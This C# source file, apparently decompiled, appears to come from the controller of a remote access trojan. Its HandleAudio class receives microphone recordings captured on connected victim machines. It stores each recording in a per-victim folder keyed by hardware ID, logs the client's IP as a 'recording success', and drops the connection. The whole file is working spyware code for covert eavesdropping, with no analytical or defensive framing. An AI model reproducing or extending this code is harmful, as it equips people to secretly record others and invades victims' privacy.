using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet;

public class HandleAudio
{
	public async void SaveAudio(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			FormAudio formAudio = (FormAudio)(object)Application.get_OpenForms().get_Item("Audio Recorder:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString());
			if (unpack_msgpack.ForcePathObject("Close").GetAsString() == "true")
			{
				((Control)formAudio.btnStartStopRecord).set_Text("Start Recording");
				((Control)formAudio.btnStartStopRecord).set_Enabled(true);
				client.Disconnected();
				return;
			}
			((Control)formAudio.btnStartStopRecord).set_Text("Start Recording");
			((Control)formAudio.btnStartStopRecord).set_Enabled(true);
			string fullPath = Path.Combine(Application.get_StartupPath(), "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "SaveAudio");
			if (!Directory.Exists(fullPath))
			{
				Directory.CreateDirectory(fullPath);
			}
			await Task.Run(delegate
			{
				byte[] asBytes = unpack_msgpack.ForcePathObject("WavFile").GetAsBytes();
				File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav", asBytes);
			});
			new HandleLogs().Addmsg("Client " + client.Ip + " recording success，file located @ ClientsFolder/" + unpack_msgpack.ForcePathObject("Hwid").AsString + "/SaveAudio", Color.Purple);
			client.Disconnected();
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg("Save recorded file fail " + ex.Message, Color.Red);
		}
	}
}
